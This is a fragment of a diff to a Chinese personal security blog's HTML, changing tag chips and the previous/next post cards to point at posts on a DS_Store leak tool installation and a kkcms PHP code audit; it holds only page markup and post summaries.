                             
-                                <a href="/tags/ssrf/">
-                                    <span class="chip bg-color">ssrf</span>
+                                <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                                    <span class="chip bg-color">杂记</span>
                                 </a>
                             
                         </div>
@@ -941,58 +824,45 @@ python3 fpm<span class="token punctuation">.</span>py <span class="token number"
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/04/07/zheng-ze-biao-da-shi-bi-ji/">
+                <a href="/2022/09/26/za-ji-yi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="正则表达式笔记">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="杂记（一）">
                         
-                        <span class="card-title">正则表达式笔记</span>
+                        <span class="card-title">杂记（一）</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            正则表达式的基本知识汇总
+                            杂记（一）由安装DS_Store文件泄露处理工具引发的一系列问题
+安装ds_store_exp-master工具，下载解压之后需要先安装依赖包 cmd执行：**pip2 install ds-store requests** 发现报错：
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-04-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-26
+                            </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/php/" class="post-category">
-                                    php
-                                </a>
-                            
-                            <a href="/categories/php/python/" class="post-category">
-                                    python
-                                </a>
-                            
-                            <a href="/categories/php/python/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" class="post-category">
-                                    正则表达式
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            uf9n1x
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/php/">
-                        <span class="chip bg-color">php</span>
-                    </a>
-                    
-                    <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
-                        <span class="chip bg-color">正则表达式</span>
+                    <a href="/tags/%E6%9D%82%E8%AE%B0/">
+                        <span class="chip bg-color">杂记</span>
                     </a>
                     
                 </div>
@@ -1006,24 +876,24 @@ python3 fpm<span class="token punctuation">.</span>py <span class="token number"
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/03/31/ssrf-gai-shu/">
+                <a href="/2022/09/14/kkcms-dai-ma-shen-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="ssrf概述">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="kkcms代码审计">
                         
-                        <span class="card-title">ssrf概述</span>
+                        <span class="card-title">kkcms代码审计</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ssrf概述
+                            继初次选择xhcms审计审计之后，对代码审计来了兴趣，一处处分析，经历失败，重来，最后找到漏洞点的过程确实很不错。因此，在喜欢xhcms审计结束后就马不停蹄找了个小众一点的cms再开启一次审计，熟悉熟悉，之后计划开始浮现tp,yii之类框架
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-31
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-14
                             </span>
                         <span class="publish-author">
                             
@@ -1036,8 +906,16 @@ python3 fpm<span class="token punctuation">.</span>py <span class="token number"
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ssrf/">
-                        <span class="chip bg-color">ssrf</span>
+                    <a href="/tags/cms/">
+                        <span class="chip bg-color">cms</span>
+                    </a>
+                    
+                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">php代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/php/">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
                 </div>
